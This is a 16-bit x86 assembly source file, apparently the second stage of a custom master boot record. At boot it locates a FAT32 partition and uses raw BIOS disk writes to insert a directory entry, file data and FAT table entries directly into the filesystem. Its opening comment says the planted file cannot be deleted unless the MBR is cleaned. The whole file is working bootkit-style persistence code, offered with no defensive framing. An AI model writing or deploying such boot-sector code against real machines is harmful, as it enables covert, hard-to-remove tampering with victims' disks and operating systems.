;
;   This code tries to insert a file directly into a FAT32 filesystem.
;   Deleting this file using the filesystem will be impossible
;   Unless the MBR is cleaned.
;

[bits 16]
[org 0x800]

; memory addresses
; taken from custom_mbr.asm
%define SECTOR_TWO_ADDR                 0x800
%define NEW_MBR_ADDR                    0x600

%define FAT32_VBR_ADDR                  0x1000
%define ROOT_DIR_ADDR                   0x1200
%define SECTOR_THREE_ADDR               0x1400

%define FAT_TABLE_ONE_ADDR              0x1600

; offsets into the master boot record
%define MBR_PART_OFFSET                 0x1be

; The fat table entry is stored in the custom_mbr.asm because there
; is not enough space in this file.
%define FAT_ENTRY_DATA_OFFSET           0x155
%define FAT_TABLE_ENTRY_OFFSET          0xc

; offsets in the partition entry structure
%define PART_TYPE_OFFSET                0x4
%define PART_START_LBA_OFFSET           0x8

; offsets into the FAT32 VBR
%define SECTORS_PER_CLUSTER_OFFSET      0x0d    ; 1 byte
%define NUM_RESERVED_SECTORS_OFFSET     0x0e    ; 2 bytes
%define SECTORS_PER_FAT_OFFSET          0x24    ; 4 bytes
%define ROOT_CLUSTER_OFFSET             0x2c    ; 4 bytes

; offsets into the root directory
%define NEW_ENTRY_OFFSET 0x40

_start:
    pusha

    mov BYTE [drive_type], dl

    mov bx, NEW_MBR_ADDR + MBR_PART_OFFSET
    mov cx, 0x4

_scan_for_fat:
    mov al, BYTE [bx + PART_TYPE_OFFSET]
    cmp al, 0xb
    jz _load_fat_vbr
    cmp al, 0xc
    jz _load_fat_vbr
    add bx, 0x10
    dec cx
    jz _no_part_handler
    jmp _scan_for_fat

_load_fat_vbr:
    call _reset_disk

    mov esi, DWORD [bx + PART_START_LBA_OFFSET]
    mov DWORD [start_of_fs_addr], esi

    push DWORD 0x0
    push esi

    push 0x0
    push FAT32_VBR_ADDR

    push 0x1
    push 0x10
    mov si, sp

    call _read_sector_lba
    add sp, 0x10

_check_extensions:
    cmp WORD [FAT32_VBR_ADDR + 0x1fe], 0xaa55
    jnz _not_a_vbr_handler

_process_vbr:
    mov al, BYTE [FAT32_VBR_ADDR + SECTORS_PER_CLUSTER_OFFSET]
    mov BYTE [sectors_per_cluster], al

    mov eax, DWORD [FAT32_VBR_ADDR + SECTORS_PER_FAT_OFFSET]
    mov DWORD [sectors_per_fat], eax

    mov ax, WORD [FAT32_VBR_ADDR + NUM_RESERVED_SECTORS_OFFSET]
    mov WORD [num_reserved_sectors], ax

    mov eax, DWORD [FAT32_VBR_ADDR + ROOT_CLUSTER_OFFSET]
    mov DWORD [root_dir_cluster_num], eax

    ; calculate LBA address of root directory
    mov edi, DWORD [start_of_fs_addr]

    ; add the number of reserved sectors
    xor ecx, ecx
    mov cx, WORD [num_reserved_sectors]
    add edi, ecx

    ; store the address of the first fat table
    mov DWORD [fat1_addr], edi

    ; add 2 * sectors_per_fat
    mov ecx, DWORD [sectors_per_fat]
    mov eax, 2                          ; assume there are only 2 FAT tables
    mul ecx                             ; result is stored in edx:aax

    add edi, eax
    mov DWORD [root_dir_lba_addr], edi

_add_root_dir_entry:
    ; read in the root directory
    push DWORD 0x0
    push edi

    push 0x0
    push ROOT_DIR_ADDR

    push 0x1
    push 0x10
    mov si, sp

    mov dl, BYTE [drive_type]
    call _read_sector_lba
    add sp, 0x10

    mov si, processing_fat_vbr_msg
    call _print_str

    ; add en entry into the root directory
    lea esi, [NEW_MBR_ADDR + FAT_ENTRY_DATA_OFFSET]
    lea edi, [ROOT_DIR_ADDR + NEW_ENTRY_OFFSET]
    mov cx, 0x20

    rep movsb

    ; copy back the modified root directory onto disk
    mov edi, DWORD [root_dir_lba_addr]

    push DWORD 0x0
    push edi

    push 0x0
    push ROOT_DIR_ADDR

    push 0x1
    push 0x10

    mov si, sp
    call _write_sector_lba
    add sp, 0x10

_inject_data:
    ; copy data to the first cluster of the directory entry
    ; load sector 3 into RAM
    mov dl, BYTE [drive_type]
    mov edi, DWORD [root_dir_lba_addr]

    push DWORD 0x0
    push DWORD 0x2

    push 0x0
    push SECTOR_THREE_ADDR

    push 0x1
    push 0x10

    mov si, sp
    call _read_sector_lba
    add sp, 0x10

    ; calculate LBA of cluster 3
    mov esi, edi
    xor eax, eax
    mov al, BYTE [sectors_per_cluster]
    mov ecx, 1
    mul ecx
    add esi, eax

    ; write sector 3 data to cluster 3
    mov dl, BYTE [drive_type]

    push DWORD 0x0
    push esi

    push 0x0
    push SECTOR_THREE_ADDR

    push 0x1
    push 0x10

    xor eax, eax

    mov si, sp
    call _write_sector_lba
    add sp, 0x10

    ; add an entry into the FAT table for cluster 3
    ; read first fat table
    mov edi, DWORD [fat1_addr]

    push DWORD 0x0
    push edi

    push 0x0
    push FAT_TABLE_ONE_ADDR

    push 0x1
    push 0x10

    mov si, sp
    call _read_sector_lba
    add sp, 0x10

    ; add the entry into the FAT table
    mov eax, DWORD [fat_entry]
    mov DWORD [FAT_TABLE_ONE_ADDR + FAT_TABLE_ENTRY_OFFSET], eax

    ; write changes to fat1 on disk
    push DWORD 0x0
    push edi

    push 0x0
    push FAT_TABLE_ONE_ADDR

    push 0x1
    push 0x10

    xor eax, eax

    mov si, sp
    call _write_sector_lba
    add sp, 0x10

    mov eax, DWORD [sectors_per_fat]
    add edi, eax

    ; write changes to fat2 on disk
    push DWORD 0x0
    push edi

    push 0x0
    push FAT_TABLE_ONE_ADDR

    push 0x1
    push 0x10

    xor eax, eax

    mov si, sp
    call _write_sector_lba
    add sp, 0x10

_end:
    popa
    retf

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _disk_io_error
    ret

_read_sector_lba:
    mov ah, 0x42
    int 0x13
    jc _disk_io_error
    ret

_write_sector_lba:
    mov ah, 0x43
    int 0x13
    jc _disk_io_error
    ret

_no_part_handler:
    mov si, no_fat_found_msg
    call _print_str
    jmp _end_loop

_not_a_vbr_handler:
    mov si, no_fat_found_msg
    call _print_str
    jmp _end_loop

_disk_io_error:
    mov si, disk_io_error_msg
    call _print_str
    jmp _end_loop

_print_str:
    lodsb
    or al, al               ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_end_loop:                  ; after printing an error, we should just loop forever
    jmp _end_loop

no_fat_found_msg:           db "a", 0x0d, 0x0a, 0x00
not_a_vbr:                  db "b", 0x0d, 0x0a, 0x00
processing_fat_vbr_msg:     db "c", 0x0d, 0x0a, 0x00
disk_io_error_msg:          db "d", 0x0d, 0x0a, 0x00

drive_type:                 db 0x00
sectors_per_cluster:        db 0x00
start_of_fs_addr:           dd 0x00
sectors_per_fat:            dd 0x00
num_reserved_sectors:       dw 0x00

root_dir_cluster_num:       dd 0x00
root_dir_lba_addr:          dd 0x00

fat1_addr:                  dd 0x00
fat_entry:                  db 0xff, 0xff, 0xff, 0x0f
